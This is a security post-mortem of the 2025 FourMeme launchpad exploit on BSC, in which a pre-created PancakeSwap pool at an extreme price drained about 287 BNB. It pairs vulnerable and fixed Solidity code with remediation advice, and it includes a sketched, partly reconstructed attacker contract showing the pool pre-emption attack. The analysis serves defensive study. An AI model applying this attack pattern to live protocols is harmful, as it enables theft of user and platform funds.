# FourMeme — Pool Pre-emption Attack Before Liquidity Migration Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-11 |
| **Protocol** | FourMeme |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$183,000 (287 BNB; per PeckShield and CoinTelegraph) |
| **Attacker** | [0x010F...53A](https://bscscan.com/address/0x010Fc97CB0a4D101dCe20DAB37361514bD59A53A) (Exploiter1 — pool creator) |
| **Attack Tx** | [0x2902...f61](https://bscscan.com/tx/0x2902f93a0e0e32893b6d5c907ee7bb5dabc459093efa6dbc6e6ba49f85c27f61) (Exploiter2 main profit tx) |
| **Vulnerable Contract** | FourMeme Launchpad (BSC) |
| **Root Cause** | Attacker pre-created a PancakeSwap pool with an extreme price before the official liquidity migration, inducing the platform to inject liquidity into the manipulated pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/FourMeme_exp.sol) |

---

## 1. Vulnerability Overview

FourMeme is a memecoin launchpad that automatically migrates liquidity to PancakeSwap after the initial sale completes. Before the official migration was executed, the attacker pre-created a PancakeSwap pool with an extremely inflated `sqrtPriceX96` value (approximately 368 trillion times the normal value). FourMeme's `addLiquidity` function did not validate the pre-existence of a pool or its initial price, causing it to inject liquidity into the manipulated pool. The attacker was able to extract a large amount of WBNB using only a minimal quantity of tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no validation of pool existence or initial price
function migrateToPool(address token, uint256 bnbAmount, uint256 tokenAmount) external {
    address pool = IFactory(factory).getPool(token, WBNB, fee);

    if (pool == address(0)) {
        // Create a new pool only when none exists
        pool = IFactory(factory).createPool(token, WBNB, fee);
        IPool(pool).initialize(calculateSqrtPrice(tokenAmount, bnbAmount));
    }
    // ❌ If pool already exists, liquidity is added without any price validation!
    // Liquidity is injected directly into the attacker's extreme-price pool

    INonfungiblePositionManager(npm).mint(
        MintParams({token0: token, token1: WBNB, ...})
    );
}

// ✅ Safe code: validates pool initial price
function migrateToPool(address token, uint256 bnbAmount, uint256 tokenAmount) external {
    address pool = IFactory(factory).getPool(token, WBNB, fee);

    if (pool != address(0)) {
        // Validate that the existing pool's current price is within the expected range
        (uint160 sqrtPriceX96,,,,,,) = IPool(pool).slot0();
        uint160 expectedPrice = calculateSqrtPrice(tokenAmount, bnbAmount);
        require(
            sqrtPriceX96 >= expectedPrice * 90 / 100 &&
            sqrtPriceX96 <= expectedPrice * 110 / 100,
            "Pool price manipulated"
        );
    } else {
        pool = IFactory(factory).createPool(token, WBNB, fee);
        IPool(pool).initialize(calculateSqrtPrice(tokenAmount, bnbAmount));
    }
    // Safely add liquidity
}
```

### On-chain Source Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The FourMeme launchpad contract at `0x5c952063c7fc8610FFDB798152D69F0B9550762b` (BSC) returns HTTP 404 on Sourcify. The vulnerable behavior below is reconstructed from the attack PoC, the DeFiHackLabs analysis, and on-chain transaction traces, not from verified source.

**Reconstructed: `addLiquidity()` — No Pool Price Validation**
```solidity
// RECONSTRUCTED — not verified source; derived from PoC + on-chain trace
// ❌ FourMeme Launchpad: 0x5c952063c7fc8610FFDB798152D69F0B9550762b
function _addLiquidityToPancakeV3(
    address token,
    uint256 bnbAmount,
    uint256 tokenAmount
) internal {
    address pool = IPancakeV3Factory(factory).getPool(token, WBNB, fee);

    if (pool == address(0)) {
        // Only creates+initializes pool if it doesn't exist yet
        pool = IPancakeV3Factory(factory).createPool(token, WBNB, fee);
        uint160 sqrtPrice = _computeSqrtPrice(tokenAmount, bnbAmount);
        IPancakeV3Pool(pool).initialize(sqrtPrice);
    }
    // ❌ If pool already exists (pre-created by attacker), no price check is performed.
    // Liquidity is added unconditionally at whatever sqrtPriceX96 the pool has.
    // Attacker pre-initializes the pool with sqrtPriceX96 ≈ type(uint160).max/2,
    // making 1 meme token worth ~368 trillion times the intended WBNB price.

    INonfungiblePositionManager(npm).mint(
        INonfungiblePositionManager.MintParams({
            token0: token < WBNB ? token : WBNB,
            token1: token < WBNB ? WBNB : token,
            fee: fee,
            tickLower: tickLower,
            tickUpper: tickUpper,
            amount0Desired: token < WBNB ? tokenAmount : bnbAmount,
            amount1Desired: token < WBNB ? bnbAmount : tokenAmount,
            amount0Min: 0,
            amount1Min: 0,  // ❌ no minimum — entire WBNB injected at attacker's price
            recipient: address(this),
            deadline: block.timestamp
        })
    );
}
```

**Why it is exploitable (identify the bug from the code):**

- The launchpad checks whether a pool exists and creates it if not. But if the pool already exists (pre-created by the attacker), it adds liquidity without validating the pool's current `sqrtPriceX96`.
- The attacker pre-creates the PancakeSwap V3 pool with an extreme `sqrtPriceX96 ≈ type(uint160).max / 2`, equivalent to a price of ~billions of WBNB per meme token (or inversely, 1 meme token for enormous WBNB).
- When the launchpad calls `mint()` with `amount0Min = 0` and `amount1Min = 0`, the pool accepts the WBNB injection at the extreme price. The attacker then swaps a handful of meme tokens for the bulk of the WBNB, extracting ~287 BNB.

```solidity
// ✅ Fix: validate pool price before adding liquidity
if (pool != address(0)) {
    (uint160 sqrtPriceX96,,,,,,) = IPancakeV3Pool(pool).slot0();
    uint160 expectedPrice = _computeSqrtPrice(tokenAmount, bnbAmount);
    require(
        sqrtPriceX96 >= expectedPrice * 95 / 100 &&
        sqrtPriceX96 <= expectedPrice * 105 / 100,
        "FourMeme: pool price manipulated"
    );
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Purchase a small amount of meme tokens from FourMeme (minimal BNB)
  │
  ├─→ [2] [Front-run] Create PancakeSwap pool before the official migration
  │         └─ sqrtPriceX96: 368 trillion × normal value (extreme high price)
  │            Effective price ratio: billions of BNB per token
  │
  ├─→ [3] FourMeme's official liquidity migration executes
  │         └─ addLiquidity() → detects existing pool
  │            Injects WBNB into manipulated pool with no price validation
  │
  ├─→ [4] Attacker: swaps minimal tokens for large amount of WBNB
  │         └─ Due to manipulated price: tiny token amount = massive WBNB output
  │
  └─→ [5] Profit: ~287 BNB (~$186,000)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract FourMemeAttacker {
    address constant PANCAKE_FACTORY = /* PancakeSwap V3 Factory */;
    address constant PANCAKE_NPM = /* NonFungiblePositionManager */;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function attack(address memeToken) external payable {
        // [1] Purchase a small amount of meme tokens from FourMeme
        IFourMeme(fourMeme).buyToken{value: 0.001 ether}(memeToken);

        // [2] Pre-empt pool creation with an extremely high sqrtPriceX96
        // Set to approximately 368 trillion times the normal price
        uint160 extremeSqrtPrice = type(uint160).max / 2; // extreme high price
        address pool = IPancakeV3Factory(PANCAKE_FACTORY).createAndInitializePoolIfNecessary(
            memeToken, WBNB, 500, extremeSqrtPrice
        );

        // [3] FourMeme migrates liquidity into this pool (triggered automatically)
        // → Platform injects a large amount of WBNB into the manipulated pool

        // [4] Swap minimal tokens for a large amount of WBNB
        uint256 tokenBalance = IERC20(memeToken).balanceOf(address(this));
        IERC20(memeToken).approve(PANCAKE_ROUTER, tokenBalance);
        // Due to extreme price: tiny token amount → massive WBNB output
        IPancakeRouter(PANCAKE_ROUTER).exactInputSingle(...);

        // Result: ~287 BNB extracted
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Pool Initialization Frontrunning |
| **CWE** | CWE-362: Race Condition |
| **Attack Vector** | External (transaction ordering manipulation) |
| **DApp Category** | Token Launchpad |
| **Impact** | 287 WBNB drained from liquidity pool |

## 6. Remediation Recommendations

1. **Pre-migration pool validation**: Before migrating liquidity, always verify that the pool's current price falls within the expected range
2. **Direct pool creation**: Have the launchpad itself create and initialize the pool to prevent third-party pre-emption
3. **Price range constraints**: Define an acceptable initial price range for the pool and block migration if the price falls outside that range
4. **Commit-Reveal pattern**: Pre-commit and verify the target pool address before executing the liquidity migration

## 7. Lessons Learned

- When a launchpad automatically migrates liquidity to an external AMM, failing to validate the state of the target pool makes the protocol vulnerable to frontrunning attacks.
- The `sqrtPriceX96` parameter in Uniswap V3/PancakeSwap V3 can be set to extreme values, so protocols must always guard against price manipulation attacks that exploit this.
- Logic that depends on transaction ordering (first-come-first-served pool creation) is a primary target for MEV/frontrunning attacks.